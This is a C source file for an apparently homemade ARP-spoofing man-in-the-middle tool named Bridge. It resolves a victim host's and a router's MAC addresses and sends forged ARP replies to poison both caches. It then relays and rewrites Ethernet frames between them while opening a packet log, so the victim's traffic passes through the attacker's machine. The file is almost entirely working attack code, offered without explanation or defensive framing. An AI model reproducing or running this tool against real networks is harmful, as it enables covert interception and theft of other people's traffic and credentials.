#include <stdio.h>
#include "xlayer.h"
#include "datalink.h"

static char *pgmname ;
static void
usage(void){
  	fprintf(stderr,"ERROR: %s <source ip> <dest ip> <default gateway> <router>\n",pgmname);
	exit(1);
}

static void
ckerr(int rc, int ec,const char *szMsg)
{
 if(rc == ec){
 	fprintf(stderr,"%s: %s %s\n",pgmname,szMsg,
				(errno==0)?"":strerror(errno));
	exit(1);
 }				
} 
int
main(int argc, char **argv)
{

	pgmname = *argv;

	if(argc < 4)
		usage();

	Bridge( argv[1], argv[2] , argv[3] , argv[4] );

	exit(0);
}

int 
Bridge( const char* localip, const char *hostip, const char *dgip, const char* gip)
{
	uint32_t sip,hip,dg,g;
	struct MAC smac, hmac, gmac;
	struct layer *stack,*ipl;
	xip iph;
	int n,frmHost,frmRoute;
	FILE *fp;

	ckerr(if_menu(&smac),-1,"ERROR: Invalid interface specification");
	ckerr(str_to_ip(localip,&sip),0,"ERROR: Invalid IP format for source");
	ckerr(str_to_ip(hostip,&hip),0,"ERROR: Invalid IP format for host");
	ckerr(str_to_ip(dgip,&dg),0,"ERROR: Invalid IP format for gateway");
	ckerr(str_to_ip(gip,&g),0,"ERROR: Invalid IP format for router");

	ckerr( (( fp = fopen("bridge.pac","w") ) == NULL)?0:1,0,
		"ERROR: could not open log file for writting ");

	ckerr(ARPRequest(&smac,&hmac,g,hip,5),-1,"ERROR: no reply from host\n");

	ckerr(ARPRequest(&smac,&gmac,hip,g,5)  ,-1,"ERROR: no route to host\n");	
	


	ARPReply(&smac,dg,&hmac,hip);
	ARPReply(&smac,hip,&gmac,g);

	filterDatalink("not arp");

	while( !kbhit() ){
		printf("[OK]\n");
		stack = recvlayers(&n);
		
		if(stack != NULL ){
			printf("reeecccccvvvvvvv\n");
			// check if srcmac from host or router
			if( ((xeth)stack->proto)->ether_shost[0] == hmac.mac[0] &&
				((xeth)stack->proto)->ether_shost[1] == hmac.mac[1] &&
				((xeth)stack->proto)->ether_shost[2] == hmac.mac[2] &&	
				((xeth)stack->proto)->ether_shost[3] == hmac.mac[3] &&
				((xeth)stack->proto)->ether_shost[4] == hmac.mac[4] &&
				((xeth)stack->proto)->ether_shost[5] == hmac.mac[5])
			frmHost = 1;
			else
				frmHost = 0;
			if( ((xeth)stack->proto)->ether_shost[0] == gmac.mac[0] &&
				((xeth)stack->proto)->ether_shost[1] == gmac.mac[1] &&
				((xeth)stack->proto)->ether_shost[2] == gmac.mac[2] &&	
				((xeth)stack->proto)->ether_shost[3] == gmac.mac[3] &&
				((xeth)stack->proto)->ether_shost[4] == gmac.mac[4] &&
				((xeth)stack->proto)->ether_shost[5] == gmac.mac[5])
			frmRoute = 1;
			else
				frmRoute = 0;

			//frmRoute	= ((memcmp( ((xeth)stack->proto)->ether_shost,gmac.mac,6)==0)?1:0);

			if( frmRoute){

				printf("from route\n");

				if( stack->next->type != LT_IP ){
					rmlayers(stack);
					continue;				
				}

				iph = (xip)stack->next->proto;

				if( memcmp( &iph->ip_dst,&hip,4) != 0 ){
					rmlayers(stack);
					continue;				
				}
				memcpy(  ((xeth)stack->proto )->ether_shost,smac.mac,6);
				memcpy(  ((xeth)stack->proto )->ether_dhost,hmac.mac,6);

				sendlayers(stack);
			//	writelayers(stack,fp);
				//printlayers(stack);
				rmlayers(stack);
				continue;
			}			
			if( frmHost ){
			//	printf("from host\n");
				
				memcpy(  ((xeth)stack->proto )->ether_shost, smac.mac,6);
				memcpy(  ((xeth)stack->proto )->ether_dhost, gmac.mac,6);


				if(stack->next->type != LT_IP){
					rmlayers(stack);
					continue;
				}

				iph = (xip)stack->next->proto;

				if( memcmp( &iph->ip_src,&hip,4) != 0 ){
					rmlayers(stack);
					continue;				
				}

				sendlayers(stack);
				//writelayers(stack,fp);
				printf("from host");
				//printlayers(stack);
				rmlayers(stack);
				continue;
			} 

		}
	}

	fclose(fp);
	//ARPReply(&gmac,dg,&hmac,hip);
	ARPReply(&hmac,hip,&gmac,g);
	return 0;
}